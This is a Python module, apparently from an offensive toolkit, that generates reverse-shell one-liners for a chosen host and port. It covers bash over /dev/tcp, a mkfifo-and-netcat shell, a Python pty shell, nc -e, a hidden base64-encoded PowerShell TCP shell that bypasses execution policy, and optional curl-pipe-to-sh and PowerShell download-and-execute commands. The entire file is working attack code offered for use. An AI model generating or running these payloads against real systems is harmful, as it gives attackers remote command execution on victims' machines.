from __future__ import annotations

import base64


def _build_powershell_b64(host: str, port: int) -> str:
    ps_script = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';"
        "$sbB=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbB,0,$sbB.Length);$s.Flush()};$c.Close()"
    )
    encoded = base64.b64encode(ps_script.encode("utf-16le")).decode("ascii")
    return f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}"


def generate_payloads(host: str, port: int, http_url: str | None = None) -> dict[str, str]:
    """Generate cross-platform reverse-shell one-liners for the active endpoint."""
    payloads = {
        "bash_tcp": f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'",
        "sh_mkfifo": f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {host} {port} >/tmp/f",
        "python3": (
            f"python3 -c 'import os,pty,socket;s=socket.socket();"
            f's.connect(("{host}",{port}));'
            f'[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")\''
        ),
        "nc_traditional": f"nc -e /bin/sh {host} {port}",
        "powershell_b64": _build_powershell_b64(host, port),
    }
    if http_url:
        base = http_url.rstrip("/")
        payloads["curl_exec"] = f"curl -fsSL {base}/rev.sh | sh"
        payloads["iwr_ps"] = f"powershell -c \"iex(irm '{base}/rev.ps1')\""
    return payloads
